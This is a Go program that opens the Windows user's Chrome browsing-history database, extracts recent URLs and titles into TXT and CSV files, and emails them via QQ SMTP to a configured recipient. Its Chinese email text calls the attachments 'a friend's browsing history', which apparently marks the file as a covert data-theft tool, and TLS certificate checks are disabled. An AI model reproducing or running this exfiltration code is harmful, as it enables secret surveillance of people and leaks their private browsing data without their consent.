package main

import (
	"crypto/tls"
	"encoding/csv"
	"errors"
	"fmt"
	"github.com/glebarez/sqlite"
	"github.com/go-ini/ini"
	"gopkg.in/gomail.v2"
	"gorm.io/gorm"
	"log"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"
)

type Urls struct {
	ID            int    `gorm:"column:id"`
	Url           string `gorm:"column:url"`
	Title         string `gorm:"column:title"`
	VisitCount    int    `gorm:"column:visit_count"`
	TypedCount    int    `gorm:"column:typed_count"`
	LastVisitTime int64  `gorm:"column:last_visit_time"`
	Hidden        int    `gorm:"column:hidden"`
}

func (u *Urls) TableName() string {
	return "urls"
}

func getUsername() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return "", err
	}
	username := currentUser.Username
	usernamearr := strings.Split(username, "\\")
	username = usernamearr[len(usernamearr)-1]
	return username, nil
}

func getHistoryPath(username string) string {
	path := fmt.Sprintf("C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", username)
	return path
}

func getDBHandle(path string) *gorm.DB {
	db, err := gorm.Open(sqlite.Open(path), &gorm.Config{})
	if err != nil {
		fmt.Println("failed to connect database")
		panic(err)
	}
	return db
}

func getHistory(db *gorm.DB, number int) ([]map[string]interface{}, error) {
	var urls []map[string]interface{}
	db.Model(Urls{}).Order("id desc").Limit(number).Find(&urls)
	if len(urls) == 0 {
		err := errors.New("查询出错，请关闭浏览器")
		return nil, err
	}
	return urls, nil
}

func CSVWriter(result []map[string]interface{}) {
	file, err := os.OpenFile("Browsing history.csv", os.O_RDWR|os.O_CREATE, 0744)
	if err != nil {
		log.Println("文件打开失败！")
	}
	defer file.Close()
	writecsv := csv.NewWriter(file)
	str := []string{"标题", "网址"}
	err = writecsv.Write(str)
	writecsv.Flush()
	for _, value := range result {
		title := fmt.Sprint(value["title"])
		url := fmt.Sprint(value["url"])
		str1 := []string{title, url}
		err = writecsv.Write(str1)
		writecsv.Flush()
	}
}

func sendMessage(username string, password string, toWho string) {
	message := "这是好友的浏览记录邮件"
	host := "smtp.qq.com"
	port := 25

	m := gomail.NewMessage()
	m.SetHeader("From", username)
	m.SetHeader("To", toWho)
	m.SetHeader("Cc", username)
	m.SetHeader("Bcc", username)
	m.SetHeader("Subject", "Hello world")

	m.SetBody("text/plain", message)
	m.Attach("Browsing history.txt")
	m.Attach("Browsing history.csv")

	d := gomail.NewDialer(host, port, username, password)
	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}

	if err := d.DialAndSend(m); err != nil {
		panic(err)
	}
}

func readConfig() map[string]string {
	config := make(map[string]string)
	configini, err := ini.Load("config.ini")
	if err != nil {
		log.Println(err)
	}
	config["username"] = configini.Section("mail").Key("username").Value()
	config["password"] = configini.Section("mail").Key("password").Value()
	config["to"] = configini.Section("mail").Key("to").Value()
	config["number"] = configini.Section("main").Key("number").Value()
	return config
}

func main() {
	config := readConfig()
	username, err := getUsername()
	if err != nil {
		println(err.Error())
	}
	path := getHistoryPath(username)
	db := getDBHandle(path)
	number, err := strconv.Atoi(config["number"])
	if err != nil {
		log.Println("配置文件number不正确", err)
		panic(err)
	}
	result, err := getHistory(db, number)
	if err != nil {
		log.Println(err)
		time.Sleep(time.Second * 3)
		panic(err)
	}
	file, err := os.OpenFile("Browsing history.txt", os.O_CREATE|os.O_RDWR, 0744)
	if err != nil {
		log.Println(err)
		time.Sleep(time.Second * 3)
		panic(err)
	}
	defer file.Close()
	for _, value := range result {
		url := value["url"]
		title := value["title"]
		content := fmt.Sprintf("标题：%v\t网址：%v\n", title, url)
		file.WriteString(content)
	}
	CSVWriter(result)
	sendMessage(config["username"], config["password"], config["to"])
}
